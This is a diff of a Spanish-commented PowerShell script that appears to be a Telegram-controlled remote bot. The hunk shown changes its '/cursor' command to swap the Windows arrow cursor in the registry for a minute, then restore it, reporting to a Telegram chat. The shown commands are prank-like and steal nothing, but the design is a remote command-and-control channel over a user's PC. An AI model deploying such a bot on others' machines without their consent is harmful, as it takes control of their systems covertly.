@@ -127,33 +127,33 @@ while ($true) {
                             $Respuesta = "Abriendo el video predefinido de YouTube en ID $MiIDNum"
                             [void](Invoke-RestMethod -Uri "$URL/sendMessage" -Method Post -Body @{ chat_id = $ChatID; text = $Respuesta })
                             continue
-                        }
-                                                "/cursor" {
-                            # 1. Cargar la API de Windows para refrescar el mouse (si no estaba cargada)
+                        }                        
+                        "/cursor" {
+                            # 1. Cargamos la API de Windows para obligar al sistema a recargar el mouse
                             $MethodDefinition = '[DllImport("user32.dll", EntryPoint="SystemParametersInfo")] public static extern bool SystemParametersInfo(uint uiAction, uint uiParam, string pvParam, uint fWinIni);'
-                            $User32 = Add-Type -MemberDefinition $MethodDefinition -Name "User32CursorTemp" -Namespace "Win32" -PassThru -ErrorAction SilentlyContinue
+                            $User32 = Add-Type -MemberDefinition $MethodDefinition -Name "User32Refrescar" -Namespace "Win32" -PassThru -ErrorAction SilentlyContinue
 
-                            # 2. AGRANDAR: Cambia el registro a tamaño gigante (4) y refresca la pantalla
-                            Set-ItemProperty -Path "HKCU:\Control Panel\Accessibility" -Name "PointerSize" -Value 4 -Force
-                            [void]$User32::SystemParametersInfo(0x0057, 0, $null, 3)
+                            # 2. AGRANDAR: Cambia la flecha normal por la flecha gigante nativa de Windows (arrow_rl.cur)
+                            Set-ItemProperty -Path "HKCU:\Control Panel\Cursors" -Name "Arrow" -Value "C:\Windows\Cursors\arrow_rl.cur" -Force
+                            [void]$User32::SystemParametersInfo(0x0057, 0, $null, 3) # Envía señal de actualización real
 
-                            # 3. Notificar a Telegram que ya está gigante
-                            $Respuesta1 = "Cursor agrandado temporalmente en ID $MiIDNum. Esperando 2 minutos..."
+                            # Notificar a Telegram
+                            $Respuesta1 = "Cursor agrandado de forma real en ID $MiIDNum. Esperando 1 minuto..."
                             [void](Invoke-RestMethod -Uri "$URL/sendMessage" -Method Post -Body @{ chat_id = $ChatID; text = $Respuesta1 })
 
-                            # 4. TIEMPO DE ESPERA: Se queda esperando 120 segundos (2 minutos)
-                            # Podés cambiar el 120 por los segundos que vos quieras (ej: 60 para 1 minuto)
-                            Start-Sleep -Seconds 120
+                            # 3. TIEMPO DE ESPERA: Lo dejamos 60 segundos (1 minuto) para que pruebes rápido
+                            Start-Sleep -Seconds 60
 
-                            # 5. RESTAURAR: Vuelve el registro al tamaño normal (1) y refresca la pantalla
-                            Set-ItemProperty -Path "HKCU:\Control Panel\Accessibility" -Name "PointerSize" -Value 1 -Force
-                            [void]$User32::SystemParametersInfo(0x0057, 0, $null, 3)
+                            # 4. RESTAURAR: Vuelve a poner la flecha estándar por defecto de Windows (arrow_l.cur)
+                            Set-ItemProperty -Path "HKCU:\Control Panel\Cursors" -Name "Arrow" -Value "C:\Windows\Cursors\arrow_l.cur" -Force
+                            [void]$User32::SystemParametersInfo(0x0057, 0, $null, 3) # Refresca para achicarlo
 
-                            # 6. Notificar a Telegram que volvió a la normalidad
+                            # Notificar fin a Telegram
                             $Respuesta2 = "Cursor restaurado automáticamente a tamaño normal en ID $MiIDNum"
                             [void](Invoke-RestMethod -Uri "$URL/sendMessage" -Method Post -Body @{ chat_id = $ChatID; text = $Respuesta2 })
                             continue
                         }
+
 
                         "/hablar" {
                             # 1. Creamos el objeto de control del sistema de Windows
